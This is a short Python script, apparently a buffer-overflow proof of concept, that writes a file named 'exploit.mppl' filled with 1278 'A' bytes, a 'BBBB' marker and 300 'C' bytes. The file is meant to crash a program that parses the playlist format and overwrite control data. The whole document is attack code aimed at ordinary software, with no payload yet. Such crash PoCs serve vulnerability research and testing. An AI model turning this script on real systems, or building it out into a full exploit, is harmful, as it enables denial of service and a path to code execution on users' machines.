#!/usr/bin/python


try:
    with open('exploit.mppl', 'wb') as f:
        # Define the data to be written
        buffer = "A" * 1278
        buffer += "BBBB"
        buffer += "C" * 300
        f.write(bytes(buffer,  "latin-1"))
        
except Exception as err:
    print(f"Unexpected {err=}, {type(err)=}")
    raise
    
